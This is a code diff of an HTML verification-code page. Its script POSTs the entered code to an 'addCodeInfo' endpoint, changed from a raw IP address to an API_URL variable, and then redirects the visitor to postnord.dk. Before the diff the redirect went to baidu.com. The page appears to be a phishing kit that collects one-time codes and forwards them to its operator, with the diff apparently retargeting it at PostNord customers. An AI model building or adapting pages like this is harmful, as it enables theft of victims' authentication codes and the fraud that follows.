@@ -6,9 +6,9 @@
   <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
   <title>code</title>
   <link rel="stylesheet" href="./css/code.css" />
-  <script src="./js/rem.js"></script>
+  <script src="js/rem.js"></script>
   <script src="https://www.jq22.com/jquery/jquery-1.10.2.js"></script>
-  <script src="./js//websocket.js"></script>
+  <script src="js/websocket.js"></script>
   <script>
     // let load = document.querySelector('.loading');
     $(function () {
@@ -65,7 +65,7 @@
 
         //发起http请求  
 
-        fetch('https://155.94.182.31:8080user/addCodeInfo', {
+        fetch(API_URL + '/user/addCodeInfo', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
@@ -87,7 +87,7 @@
       let aaaa = document.querySelector('.btn');
       aaaa.onclick = function () {
         setInterval(function () {
-          window.location.href = 'https://www.baidu.com/';
+          window.location.href = 'https://www.postnord.dk/';
         }, 1000);
       };
     </script> -->
@@ -103,10 +103,10 @@
     <input class="code" type="number" />
     <input class="code" type="number" />
     <div class="tip">
-      <img src="./img/gantan.png" alt="" />
+      <img src="img/gantan.png" alt="" />
       <i>The verification code is entered incorrectly. Please fill in it again.</i>
     </div>
-    <div class="loading"><img src="./img/loading.png" alt="" /></div>
+    <div class="loading"><img src="img/loading.png" alt="" /></div>
     <button type="button" class="btn">Submit</button>
   </div>
   <div class="introduce">
@@ -123,7 +123,7 @@
       btn.onclick = function () {
         let flag = true;
         if (flag) {
-          window.location.href = 'https://www.baidu.com/';
+          window.location.href = 'https://www.postnord.dk/';
         }
       };
     </script> -->
